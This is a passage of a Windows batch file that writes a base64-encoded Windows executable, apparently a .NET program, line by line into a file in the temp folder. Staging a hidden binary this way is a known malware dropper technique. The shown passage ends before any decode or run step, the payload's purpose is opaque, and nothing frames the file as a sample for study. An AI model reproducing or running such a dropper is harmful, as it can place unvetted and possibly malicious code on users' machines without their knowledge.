@Echo off
echo TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>%tmp%\x
echo AAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4g>>%tmp%\x
echo aW4gRE9TIG1vZGUuDQ0KJAAAAAAAAABQRQAATAEDABxxyGgAAAAAAAAAAOAAAgELAQgAAH>>%tmp%\x
echo YEAAAKAAAAAAAA3pQEAAAgAAAAAAAAAABAAAAgAAAAAgAABAAAAAAAAAAEAAAAAAAAAADg>>%tmp%\x
echo BAAAAgAAAAAAAAIAQIUAABAAABAAAAAAEAAAEAAAAAAAABAAAAAAAAAAAAAAAJCUBABLAA>>%tmp%\x
echo AAAKAEAAAIAAAAAAAAAAAAAAAAAAAAAAAAAMAEAAwAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>%tmp%\x
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAACAAAAAAAAAAAAAAACCAAAEgAAA>>%tmp%\x
echo AAAAAAAAAAAC50ZXh0AAAA5HQEAAAgAAAAdgQAAAIAAAAAAAAAAAAAAAAAACAAAGAucnNy>>%tmp%\x
echo YwAAAAAIAAAAoAQAAAgAAAB4BAAAAAAAAAAAAAAAAABAAABALnJlbG9jAAAMAAAAAMAEAA>>%tmp%\x
echo ACAAAAgAQAAAAAAAAAAAAAAAAAQAAAQgAAAAAAAAAAAAAAAAAAAADAlAQAAAAAAEgAAAAC>>%tmp%\x
echo AAUAuL8BANjUAgADAAAAAQAABkS6AQBIBQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>%tmp%\x
echo AAAAAAAAAAAAAAAAAAABMwAwBLAAAAAAAAACgBAAAKFigCAAAKKAMAAAoU/gYDAAAGcwQA>>%tmp%\x
echo AApvBQAACignAAAGLBgoCQAABiwRKJcFAAYtCn4BAAAEb5wFAAYoBAAABigCAAAGKgBufg>>%tmp%\x
echo IAAAQtBygHAAAKLAYoCAAACioWKAkAAAoqEzADAD0AAAABAAARA28KAAAKLDQoawYABgoG>>%tmp%\x
echo KAsAAAosASpzDAAACiUXbw0AAAolF28OAAAKJQZvDwAACigQAAAKJigCAAAGKgAAABMwAQ>>%tmp%\x
echo BOAAAAAAAAAChHBwAGfjoDAAQsCn46AwAEb8QBAAZ+BwEABCwKfgcBAARv2QEABn4CAAAE>>%tmp%\x
echo LBp+AgAABG8RAAAKfgIAAARvEgAAChSAAgAABChdBgAGKgAAGzAFANUCAAACAAARfg0AAA>>%tmp%\x
echo QocwYABnOdAQAGCn4XAAAEKFwGAAYsFAZvnAEABi0MfgwAAAQoCwAACiwCFip+DwAABH4Q>>%tmp%\x
echo AAAEKEwFAAZ+EgAABH4TAAAEKAsAAAosB3IBAABwKw9+EwAABHIDAABwKBMAAAp+FAAABC>>%tmp%\x
echo gTAAAKKBQAAAoozQYABijGBgAGKMoGAAYoaAYABiZ+JgAABCwiKBUAAAosCigWAAAKbxcA>>%tmp%\x
echo AAooBQAABiwKKBYAAApvFwAACn4kAAAELBEoDwAABiwKKBYAAApvFwAACn4jAAAELBEoCw>>%tmp%\x
echo AABiwKKBYAAApvFwAACn4VAAAELBQoygYABijMBgAGKBgAAAo5xAEAAChiBgAGfhYAAAQs>>%tmp%\x
echo DShZBgAGLQYXKM8GAAZ+FQAABCwifhkAAAQsGyjKBgAGGCgZAAAKKMoGAAYaKBkAAAreAy>>%tmp%\x
echo beAH4VAAAELEJ+IQAABCw7fhMAAAQoCwAACi0vKMwGAAYoGgAACnMbAAAKJSVvHAAAChhg>>%tmp%\x
echo bx0AAAolbxwAAAoaYG8dAAAK3gMm3gB+GgAABCwwfgQAAAQlLRcmfgMAAAT+BhMAAAZzHg>>%tmp%\x
echo AACiWABAAABHMfAAAKJRdvIAAACm8hAAAKfiIAAAQsSXMiAAAKcwwAAAoLBxdvDQAACgdy>>%tmp%\x
echo BwAAcG8PAAAKB3IhAABwKCMAAApybQAAcCgkAAAKbyUAAAolB28mAAAKbycAAAom3gMm3g>>%tmp%\x
echo B+JwAABCwwfgUAAAQlLRcmfgMAAAT+BhQAAAZzHgAACiWABQAABHMfAAAKJRdvIAAACm8h>>%tmp%\x
echo AAAKfiUAAAQsMH4GAAAEJS0XJn4DAAAE/gYVAAAGcx4AAAolgAYAAARzHwAACiUXbyAAAA>>%tmp%\x
echo pvIQAACn4oAAAELDB+BwAABCUtFyZ+AwAABP4GFgAABnMeAAAKJYAHAAAEcx8AAAolF28g>>%tmp%\x
echo AAAKbyEAAAoGc5sFAAaAAQAABBcqKF0GAAZ+AQAABChWBgAGFioAAAABKAAAAAAnARg/AQ>>%tmp%\x
echo MVAAABAABcASyIAQMVAAABAADJAUYPAgMBAAABEzACABYAAAADAAARcpMAAHAoCgAABgoS>>%tmp%\x
echo ACgoAAAKFv4DKgAAEzADADUAAAAEAAARFgp+KQAACnKrAABwFm8qAAAKbysAAAoLFgwrEQ>>%tmp%\x
echo cImgIoGAAACiwCFwoIF1gMCAeOaTLpBioAAAATMAIAWwAAAAAAAAACbywAAAofGjIKAm8s>>%tmp%\x
echo AAAKHyMxAhYqAnIHAQBwby0AAAosDQJyCwEAcG8tAAAKLSkCcg8BAHBvLgAACiwaAnITAQ>>%tmp%\x
echo Bwby4AAAosDQJyFwEAcG8uAAAKLQIXKhYqABswAgBMAAAAAwAAESgeAAAGKA0AAAYsK34v>>%tmp%\x
echo AAAKKAYAAAYmfh8AAAQoMAAACgofDQYoCAAABiYoBwAABiYGKDEAAAoguAsAACgyAAAKKA>>%tmp%\x
echo 4AAAbeAybeACoBEAAAAAAAAEhIAAMBAAABEzAEAEwAAAAFAAARG40JAAABJRZyGwEAcKIl>>%tmp%\x
echo F3ItAQBwoiUYcj8BAHCiJRlyVwEAcKIlGnJzAQBwogoWCysRBgeaKDMAAAqOLAIXKgcXWA>>%tmp%\x
echo sHBo5pMukWKhswBADDAAAABgAAESg0AAAKChYLOKwAAAAGB5oMCG81AAAKLQwIbzYAAAoY>>%tmp%\x
echo QJAAAAAACG83AAAKcokBAHAoEwAACg0IbzcAAAp+HgAABHKhAQBwKCQAAAoTBAkoOAAACi>>%tmp%\x
echo wGCSg5AAAKEQQoOAAACiwHEQQoOQAACgkYGHM6AAAKczsAAAoTBREFcqsBAHBvPAAAChEF>>%tmp%\x
echo cr8BAHB+HgAABHKhAQBwKCQAAApvPAAACt4MEQUsBxEFbz0AAArc3gMm3gAHF1gLBwaOaT>>%tmp%\x
echo 9L////KgABHAAAAgB7ACmkAAwAAAAAAAAmAIyyAAMBAAABLnMSAAAGgAMAAAQqHgIoPgAA>>%tmp%\x
echo CiqScz8AAAqAAgAABCMAAAAAAEzNQHPYAQAGJn4CAAAEKEAAAAoqAAAAGzAFADkAAAAAAA>>%tmp%\x
echo AAAH4YAAAEKAwAAAYtGyABAACAcqsAAHB+GAAABCjKBgAGFyiXBgAGJt4DJt4AIIgTAAAo>>%tmp%\x
echo MgAACivHAAAAARAAAAAAAQApKgADAQAAARooEAAABioAGigOAAAGKgAbMAQApwAAAAcAAB>>%tmp%\x
echo EfDSgXAAAGLQIUKgB+LwAACigZAAAGLQcUDN2GAAAAHw0oGAAABgoGfi8AAAooQgAACiwE>>%tmp%\x
echo FAzebX4vAAAKCwYoGwAABgsHfi8AAAooQgAACiwEFAzeTwYoHQAABg0JjSQAAAETBAcRBB>>%tmp%\x
echo YJKEMAAAooRAAAChEEb0UAAAoXjSYAAAFvRgAACgzeHAd+LwAACihHAAAKLAcGKBwAAAYm>>%tmp%\x
echo 3CgaAAAGJtwIKgABHAAAAgA+AEuJABUAAAAAAgAMAJKeAAcAAAAAHgIoPgAACiqufgkAAA>>%tmp%\x
echo QtHnLPAQBw0AUAAAIoSAAACm9JAAAKc0oAAAqACQAABH4JAAAEKhp+CgAABCoAHgKACgAA>>%tmp%\x
